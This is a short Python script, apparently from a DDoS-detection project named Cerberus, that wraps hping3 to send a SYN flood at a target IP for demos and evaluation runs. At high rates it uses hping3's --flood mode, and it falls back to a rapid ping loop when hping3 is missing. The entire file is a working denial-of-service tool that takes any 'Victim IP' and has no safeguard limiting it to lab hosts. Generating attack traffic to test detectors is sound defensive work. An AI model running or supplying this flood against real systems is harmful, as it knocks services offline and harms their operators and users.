#!/usr/bin/env python3
"""
attack_gen.py — synthetic DDoS traffic via hping3 (M6).

Wraps hping3 SYN flood for supervisor demos and evaluation runs.
Requires root for raw sockets (hping3 typically needs sudo).

    sudo python3 attack/attack_gen.py --target 192.168.1.10 --rate 200 --duration 30
"""

from __future__ import annotations

import argparse
import shutil
import signal
import subprocess
import sys
import time


def main() -> None:
    p = argparse.ArgumentParser(description="Cerberus attack traffic generator")
    p.add_argument("--target", required=True, help="Victim IP")
    p.add_argument("--rate", type=int, default=200, help="Approx packets/sec")
    p.add_argument("--duration", type=int, default=30, help="Seconds")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--interface", default=None, help="Optional -I iface for hping3")
    args = p.parse_args()

    hping = shutil.which("hping3")
    if not hping:
        print("hping3 not found. Install: sudo apt install hping3", file=sys.stderr)
        # Fallback: ICMP flood via ping loop so demos still produce packets.
        print("Falling back to rapid ping (weaker but works without hping3)...")
        end = time.time() + args.duration
        while time.time() < end:
            subprocess.run(
                ["ping", "-c", "1", "-W", "1", args.target],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        return

    # hping3 -S SYN; -i uX = microseconds between packets.
    # High rate → --flood and kill after duration.
    if args.rate >= 5000:
        cmd = [hping, "-S", "-p", str(args.port), "--flood"]
    else:
        interval_us = max(1, int(1_000_000 / max(args.rate, 1)))
        count = max(1, args.rate * args.duration)
        cmd = [
            hping,
            "-S",
            "-p",
            str(args.port),
            "-i",
            f"u{interval_us}",
            "-c",
            str(count),
        ]
    if args.interface:
        cmd.extend(["-I", args.interface])
    cmd.append(args.target)

    print(f"Running: {' '.join(cmd)}")
    proc = subprocess.Popen(cmd)
    try:
        if args.rate >= 5000:
            time.sleep(args.duration)
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=5)
        else:
            proc.wait(timeout=args.duration + 30)
    except subprocess.TimeoutExpired:
        proc.kill()
    except KeyboardInterrupt:
        proc.send_signal(signal.SIGINT)
        proc.wait(timeout=5)
    print("Attack generator finished.")


if __name__ == "__main__":
    main()
